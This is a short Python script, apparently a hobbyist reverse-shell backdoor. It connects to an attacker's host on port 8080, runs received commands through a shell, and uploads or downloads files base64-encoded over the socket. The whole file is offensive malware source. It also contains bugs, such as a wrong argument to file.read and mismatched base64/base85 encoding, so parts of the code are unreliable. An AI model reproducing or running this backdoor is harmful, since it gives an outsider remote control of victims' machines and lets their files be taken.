#!/usr/bin/env python

import socket
import subprocess
import json
import os
import base64


def exec_cmd(cmd):
    return subprocess.check_output(cmd, shell=True)


connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection.connect(("hacker ip", 8080))


def send(cmd):
    data = json.dumps(cmd)
    connection.send(data)


def recive():
    res = ""
    while True:
        try:
            res += connection.recv(1024)
            return json.loads(res)
        except ValueError:
            continue


def change_dir(path):
    os.chdir(path)
    return "Changing directory to" + path


def read_file(path):
    with open(path, 'rb') as file:
        return base64.b64encode(file.read(path))


def write_file(path, content):
    with open(path, "wb") as file:
        file.write(base64.b85decode(content))
        return "Downloading the file..."


while True:
    command = recive()
    try:
        if command[0] == "exit":
            connection.close()
            exit()
        elif command[0] == "cd" and len(command) > 1:
            command_res = change_dir(command[1])
        elif command[0] == "download":
            command_res = read_file(command[1])
        elif command[0] == "upload":
            command_res = write_file(command[1], command[2])
        else:
            command_res = exec_cmd(command)
    except Exception:
        command_res = "Error during cmd exec...!"
    send(command_res)

connection.close()
